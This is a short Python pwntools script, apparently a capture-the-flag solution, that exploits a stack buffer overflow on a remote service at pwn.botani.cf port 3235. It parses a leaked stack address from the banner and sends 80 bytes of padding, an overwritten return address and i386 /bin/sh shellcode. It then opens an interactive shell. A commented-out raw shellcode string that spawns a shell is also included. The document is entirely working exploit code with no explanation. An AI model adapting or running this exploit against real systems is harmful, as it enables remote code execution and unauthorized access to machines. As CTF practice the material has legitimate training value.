from pwn import * 
import re
                                                                                                                     
r = remote('pwn.botani.cf',3235)
#r = remote('127.0.0.1',3235)
data = r.recvuntil('bijak')
print data
addr = int(re.findall(r'\d+',data)[0])
addr = addr+20
junk = 'A'*80 
esp = p32(addr)
#nop = '\x90'*12
shell = asm(shellcraft.i386.linux.sh())
#shell ="\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
payload = junk+esp+shell 
r.send(payload) 
r.recv() 
r.interactive()
r.close()
